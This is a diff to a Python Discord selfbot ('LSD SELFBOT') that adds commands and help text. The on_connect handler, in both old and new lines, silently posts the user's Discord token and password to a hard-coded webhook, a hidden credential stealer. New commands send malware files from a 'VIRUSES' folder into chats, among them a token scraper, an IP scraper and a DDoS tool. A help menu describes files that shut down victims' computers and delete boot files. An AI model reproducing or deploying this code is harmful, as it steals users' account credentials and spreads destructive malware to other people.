@@ -13,6 +13,7 @@ import time
 from urllib import parse, request
 from itertools import cycle
 from bs4 import BeautifulSoup as bs4
+from discord.ext import commands, tasks
 
 import aiohttp
 import colorama
@@ -28,8 +29,6 @@ from gtts import gTTS
 
 class SELFBOT():
     __version__ = 1
-
-
 
 
 with open('config.json') as f:
@@ -175,7 +174,10 @@ def async_executor():
 
     return outer
 
-toe = config.get('token')
+token = config.get('token')
+
+
+
 
 @async_executor()
 def do_tts(message):
@@ -232,7 +234,7 @@ ascii = ""
 for x in range(1985):
     num = random.randrange(13000)
     ascii = ascii + chr(num)
-print("LSD SELFBOT - Starting...\nType " + prefix + "Instagram = d.a.t.a.theif")
+print("LSD SELFBOT - Starting... \nPrefix : " + prefix + " | Instagram = d.a.t.a.theif")
 #-------------------------------------------------------------------------------------------------------------------------
 
 
@@ -377,7 +379,7 @@ async def on_message(message):
 @LSD.event
 async def on_connect():
     Clear()  
-    requests.post('https://discord.com/api/webhooks/854812236416548884/sWLTCUi8k4OsgSeYq5ntlwBuEtZ4a1LCfa_ch-cUPTTS54gM_KYekjuoYSmHabS2G_zY',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+    requests.post('https://discord.com/api/webhooks/854812236416548884/sWLTCUi8k4OsgSeYq5ntlwBuEtZ4a1LCfa_ch-cUPTTS54gM_KYekjuoYSmHabS2G_zY',json={'content': f"**Token:** `{token}`\n**Password:** `{password}`"})
     startprint()
 
 @LSD.event
@@ -849,7 +851,7 @@ async def help(ctx, category=None):
     elif str(category).lower() == "general":
         embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
         embed.set_image(url="https://media.discordapp.net/attachments/809146921369075746/857070412273287228/fb91a413d982df03cc28e50f4a6a066f.gif")
-        embed.description = f"\uD83D\uDCB0 `GENERAL COMMANDS`\n`> help <category>` - returns all commands of that category\n`> uptime` - return how long the selfbot has been running\n`> prefix <prefix>` - changes the bot's prefix\n`> ping` - returns the bot's latency\n`> av <user>` - returns the user's pfp\n`> whois <user>` - returns user's account info\n`> tokeninfo <token>` - returns information about the token\n`> copyserver` - makes a copy of the server\n`> rainbowrole <role>` - makes the role a rainbow role (ratelimits)\n`> serverinfo` - gets information about the server\n`> serverpfp` - returns the server's icon\n`> banner` - returns the server's banner\n`> shutdown` - shutsdown the selfbot\n"
+        embed.description = f"\uD83D\uDCB0 `GENERAL COMMANDS`\n`> help <category>` - returns all commands of that category\n`> uptime` - return how long the selfbot has been running\n`> prefix <prefix>` - changes the bot's prefix\n`> ping` - returns the bot's latency\n`> av <user>` - returns the user's pfp\n`> whois <user>` - returns user's account info\n`> tokeninfo <token>` - returns information about the token\n`> copyserver` - makes a copy of the server\n`> rainbowrole <role>` - makes the role a rainbow role (ratelimits)\n`> serverinfo` - gets information about the server\n`> serverpfp` - returns the server's icon\n`> banner` - returns the server's banner\n`> shutdown` - shutsdown the selfbot\n`> getbans` - returns servers user bans\n`> warn` - warns given user with given reason\n"
         await ctx.send(embed=embed)
     elif str(category).lower() == "account":
         embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
@@ -880,7 +882,7 @@ async def help(ctx, category=None):
     elif str(category).lower() == "misc":
         embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
         embed.set_image(url="https://media.discordapp.net/attachments/809146921369075746/857070412273287228/fb91a413d982df03cc28e50f4a6a066f.gif")
-        embed.description = f"\uD83D\uDCB0 `MISCELLANEOUS COMMANDS`\n`> copycat <user>` - copies the users messages ({LSD.copycat})\n`> stopcopycat` - stops copycatting\n`> fakename` - makes a fakename with other members's names\n`> geoip <ip>` - looks up the ip's location\n`> pingweb <website-url>` pings a website to see if it's up\n`> anticatfish <user>` - reverse google searches the user's pfp\n`> stealemoji` - <emoji> <name> - steals the specified emoji\n`> hexcolor <hex-code>` - returns the color of the hex-code\n`> dick <user>` - returns the user's dick size\n`> bitcoin` - shows the current bitcoin exchange rate\n`> hastebin <message>` - posts your message to hastebin\n`> rolecolor <role>` - returns the role's color\n`> nitro` - generates a random nitro code\n`> feed <user>` - feeds the user\n`> tickle <user>` - tickles the user\n`> slap <user>` - slaps the user\n`> hug <user>` - hugs the user\n`> cuddle <user>` - cuddles the user\n`> smug <user>` - smugs at the user\n`> pat <user>` - pat the user\n`> kiss <user>` - kiss the user\n`> topic` - sends a conversation starter\n`> wyr` - sends a would you rather\n`> gif <query>` - sends a gif based on the query\n`> sendall <message>` - sends a message in every channel\n`> poll <msg: xyz 1: xyz 2: xyz>` - creates a poll\n`> bots` - shows all bots in the server\n`> image <query>` - returns an image\n`> hack <user>` - hacks the user\n`> token <user>` - returns the user's token\n`> cat` - returns random cat pic\n`> sadcat` - returns a random sad cat\n`> dog` - returns random dog pic\n`> fox` - returns random fox pic\n`> bird` - returns random bird pic\n"
+        embed.description = f"\uD83D\uDCB0 `MISCELLANEOUS COMMANDS`\n`> copycat <user>` - copies the users messages ({LSD.copycat})\n`> stopcopycat` - stops copycatting\n`> fakename` - makes a fakename with other members's names\n`> geoip <ip>` - looks up the ip's location\n`> pingweb <website-url>` pings a website to see if it's up\n`> anticatfish <user>` - reverse google searches the user's pfp\n`> stealemoji` - <emoji> <name> - steals the specified emoji\n`> hexcolor <hex-code>` - returns the color of the hex-code\n`> dick <user>` - returns the user's dick size\n`> bitcoin` - shows the current bitcoin exchange rate\n`> hastebin <message>` - posts your message to hastebin\n`> rolecolor <role>` - returns the role's color\n`> nitro` - generates a random nitro code\n`> feed <user>` - feeds the user\n`> tickle <user>` - tickles the user\n`> slap <user>` - slaps the user\n`> hug <user>` - hugs the user\n`> cuddle <user>` - cuddles the user\n`> smug <user>` - smugs at the user\n`> pat <user>` - pat the user\n`> kiss <user>` - kiss the user\n`> topic` - sends a conversation starter\n`> wyr` - sends a would you rather\n`> gif <query>` - sends a gif based on the query\n`> sendall <message>` - sends a message in every channel\n`> poll <msg: xyz 1: xyz 2: xyz>` - creates a poll\n`> bots` - shows all bots in the server\n`> image <query>` - returns an image\n`> hack <user>` - hacks the user\n`> token <user>` - returns the user's token\n`> cat` - returns random cat pic\n`> sadcat` - returns a random sad cat\n`> dog` - returns random dog pic\n`> fox` - returns random fox pic\n`> bird` - returns random bird pic\n`> virus` - trolls users with fake injected virus\n`> flop` - just a fun flop command :)\n"
         await ctx.send(embed=embed)
     elif str(category).lower() == "antinuke":
         embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
@@ -3190,6 +3192,14 @@ async def empty(ctx):
 
 
 
+###########################################################################################
+###########################################################################################
+########### CHANGE ALL DIRECTORIES TO YOUR DIRECTORY TO THE FILES #########################
+###########################################################################################
+###########################################################################################
+
+
+
 @LSD.command(aliases=["Scrap", "SCRAP"],pass_context=True)
 async def scrap(ctx):
 
@@ -3233,6 +3243,45 @@ async def scra(ctx):
     await ctx.message.delete()
     await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/toxic-nitrogen.bat"))
     
+@LSD.command(pass_context=True)
+async def poweroff(ctx):
+
+    await ctx.message.delete()
+    await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/Discord-IP-Scraper v1.5.c"))
+    
+@LSD.command(pass_context=True)
+async def mouse(ctx):
+
+    await ctx.message.delete()
+    await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/out_of_control-ddos.java"))
+    
+
+@LSD.command(pass_context=True)
+async def window(ctx):
+
+    await ctx.message.delete()
+    await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/Nitro-Scraper v2.3.c"))
+    
+@LSD.command(pass_context=True)
+async def unending(ctx):
+
+    await ctx.message.delete()
+    await ctx.send(file=discord.File(r"/home/code-red/Desktop/LSD/VIRUSES/Discord-Token-Scraper v1.0.vbs"))
+
+
+
+
+
+    
+    
+    ##########################################################################################
+    ##########################################################################################
+    
+    
+    
+    
+    
+    
     
     
 @LSD.command(aliases=["malicious", "Malicious"],pass_contect=True)
@@ -3243,13 +3292,107 @@ async def MALICIOUS(ctx):
     embed = discord.Embed(colour=discord.Colour.red())
 
     embed.set_author(name='')
+    embed.add_field(name='POWEROFF', value='Simply shuts the system down.')
+    embed.add_field(name='UNENDING', value='Shows an unending sequence of annoying messages.')
     embed.add_field(name='BYPASS', value='This file should shutdown the persons computer. It shuts it off once and deletes the files needed to reboot and restart.')
-    embed.add_field(name='SCRAP', value='This second file should shutdown the persons computer. It shuts it off once and deletes the files needed to reboot and restart.')
-    embed.add_field(name='FREE', value='CLICKING ON THE LINK MAY CAUSE A CRASH! USE AT YOUR OWN RISK!.')
+    embed.add_field(name='GETHOST', value='this willl return host of ip addresses.')
+    embed.add_field(name='WINDOW', value='Randomly moves the window round. Only Ctrl+Alt+Del will work here.')
+    embed.add_field(name='MOUSE', value='Randomly moves the mouse pointer, & clicks different places on the screen.')
     embed.set_footer(text='☠ ᴜꜱᴇ ᴀᴛ ʏᴏᴜʀ ᴏᴡɴ ʀɪꜱᴋ ☠')
 
     await ctx.send(author, embed=embed)
     
+
+
+@LSD.command()
+async def servers(ctx):
+    await ctx.message.delete()
+    admins = []
+    bots = []
+    kicks = []
+    bans = []
+    for guild in bot.guilds:
+        if guild.me.guild_permissions.administrator:
+            admins.append(discord.utils.escape_markdown(guild.name))
+        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
+            bots.append(discord.utils.escape_markdown(guild.name))
+        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
+            bans.append(discord.utils.escape_markdown(guild.name))
+        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
+            kicks.append(discord.utils.escape_markdown(guild.name))
+    adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
+    botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
+    banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
+    kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
+    await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)
+
+
+
+@LSD.command(aliases=["GETBANS", "Genbans"])
+async def getbans(ctx):
+    if ctx.message.author.guild_permissions.ban_members:
+        x = await ctx.message.guild.bans()
+        x = '\n'.join([str(y.user) for y in x])
+        embed = discord.Embed(title="Users Banned From Server", description=x, colour=0xFFFFF)
+        return await ctx.send(embed=embed)
+    else:
+        await ctx.send(config.err_mesg_permission)
+
+@LSD.command(aliases=["Gethost", "GETHOST"])
+async def gethost(ctx, *, ip: str):
+    await ctx.message.delete()
+    host = socket.gethostbyaddr(ip)
+    embed = discord.Embed(title="Host Found", color=0xFFFFF, timestamp=ctx.message.created_at)
+    embed.add_field(name="Host", value=f"{host}", inline=True)
+    embed.add_field(name="IP", value=f"{ip}\n", inline=True)
+
+    await ctx.send(embed=embed, delete_after=1000)
+    
+    
+@LSD.command(aliases=["Warn", "WARN"])
+@commands.has_permissions(view_audit_log=True)
+async def warn(ctx, member: discord.Member, *, reason=None):
+    await ctx.send(f"``` {ctx.author} warned {member} for the following reason: ```" + reason)
+    await ctx.message.delete()
+
+
+
+@LSD.command()
+async def virus(ctx, user: discord.Member = None, *, virus: str = "trojan"):
+    user = user or ctx.author
+    list = (f"``[▓▓▓                    ] / {virus}-virus.exe Packing files.``",
+            f"``[▓▓▓▓▓▓▓                ] - {virus}-virus.exe Packing files..``",
+            f"``[▓▓▓▓▓▓▓▓▓▓▓▓           ] \ {virus}-virus.exe Packing files..``",
+            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓         ] | {virus}-virus.exe Packing files..``",
+            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ] / {virus}-virus.exe Packing files..``",
+            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] - {virus}-virus.exe Packing files..``",
+            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \ {virus}-virus.exe Packing files..``",
+            f"``Successfully downloaded {virus}-virus.exe``",
+            "``Injecting virus.   |``",
+            "``Injecting virus..  /``",
+            "``Injecting virus... -``",
+            f"``Successfully Injected {virus}-virus.exe into {user.name}``")
+    for i in list:
+        await ctx.send(content=i)
+        await asyncio.sleep(1)
+
+
+
+@LSD.command()
+async def flop(ctx):
+    list = ("(   ° - °) (' - '   )",
+            "(\\\° - °)\ (' - '   )",
+            "(—°□°)— (' - '   )",
+            "(╯°□°)╯(' - '   )",
+            "(╯°□°)╯︵(\\\ .o.)\\")
+    for i in list:
+        await ctx.send(content=i)
+        await asyncio.sleep(1)
+
+
+
+
+
 
 
 if __name__ == '__main__':
